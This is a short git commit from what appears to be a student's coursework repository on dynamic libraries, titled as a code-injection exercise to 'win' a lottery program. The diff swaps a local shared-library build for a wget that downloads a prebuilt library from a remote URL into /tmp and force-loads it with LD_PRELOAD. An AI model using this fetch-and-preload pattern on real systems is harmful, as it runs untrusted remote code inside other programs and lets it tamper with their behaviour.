e34f3b44199338eea268f01d5ef5a09620bc0f8e
Sunday-Gad <sundayzephaniahgad@gmail.com>
2022-10-03 15:45:50 +0000

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -shared -o libruin.so
-export LD_PRELOAD=$PWD/libruin.so
+wget -P /tmp/ https://raw.github.com./Sunday-Gad/alx-low_level_programming/main/0x18-dynamic_libraries/libruin.so
+export LD_PRELOAD=/tmp/libruin.so
